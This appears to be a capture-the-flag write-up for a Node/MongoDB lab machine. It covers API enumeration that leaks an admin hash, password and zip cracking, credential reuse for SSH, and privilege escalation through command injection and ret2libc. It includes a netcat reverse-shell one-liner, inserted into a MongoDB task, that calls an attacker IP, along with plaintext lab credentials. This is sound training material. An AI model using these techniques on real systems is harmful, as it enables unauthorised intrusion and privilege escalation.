## Takeaway
- When enumerating modern web application, it is a good idea to try to query for different backend APIs for interesting responses
	- There might be sensitive APIs with bad access control.
- <mark>Do take a careful look at PrivEsc of the Machine. So much to learn here.</mark>
## Metadata
- Using `wappalyzer` extension, we can identify that the website is running a stack of  `Angular` + `Express`.![[Pasted image 20231226151102.png]]
- By looking at the network traffic, we can identify lots of API endpoints embedded within the JavaScript files.![[Pasted image 20231226153039.png]]
	- `/api/users/latest` is of the most interesting one. By sending a `GET` request, one can retrieve the `username` and `password hash` of the administrator user.![[Pasted image 20231226153238.png]]
	- Use [crackstation](https://crackstation.net/) to find the actual `password` and obtain a pair of a valid administrator credential `myP14ceAdm1nAcc0uNT:manchester`
- Upon Logging in as administrator, one can download a copy of the backup of the website in development.![[Pasted image 20231226154103.png]]
	- It is not hard to see that the initial file is base64 encoded. Use the command `base64 -d myplace.backup > myplaceDecoded.backup` to decode.![[Pasted image 20231226154254.png]]
	- Anther `file` command will reveal that the decoded file is actually of  `zip` format. However, unzipping requires a password.![[Pasted image 20231226154749.png]]
	- `fcrackzip` can help brute force the password.![[Pasted image 20231226155721.png]]
- Upon inspecting the unzipped the back up file, one can identify a set of credential used to log into `mongoDB` which also happens to be a set of credentials for `SSH`.![[Pasted image 20231226195631.png]]
- 
#### Attack Path
- <mark>Exploitation</mark>
	- Log in as user `mark` through `SSH`.
- <mark>Post-Exploitation</mark>
	- <mark>mark => tom</mark>
		- `linPEAS` identify that another node.js application is running under local user `tom`. The application is executing commands stored in `mongoDB` collection called `tasks` in a regular interval.![[Pasted image 20231226200002.png]]
		- Log into `mongoDB` with mark's credential (`mongo 127.0.0.1/scheduler -u mark -p 5AYRft73VtFpc84k`) and insert a document with command `db.tasks.insertOne({cmd:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 4444 >/tmp/f"})`. Finally, wait for reverse shell callback.![[Pasted image 20231226202005.png]]![[Pasted image 20231226202144.png]]
	- <mark>tom => root</mark>
		- 1.`Bypass Sanity Checks`: run the binary from the `/` and specify the third argument as `root`
			- `/usr/local/bin/backup -q [token] root`
		- 2. `Command Injection` `ghidra` will identify that sanity checks do not rule out symbol `>` before forming a command to be executed.![[Pasted image 20231227175123.png]]![[Pasted image 20231227185045.png]]
			- whatever after `/bin/bash` needed otherwise shell's `stdout` will be redirected to `/dev/null`
		- 3. `BoF`: `ret2libc`
			- https://www.youtube.com/watch?v=sW10TlZF62w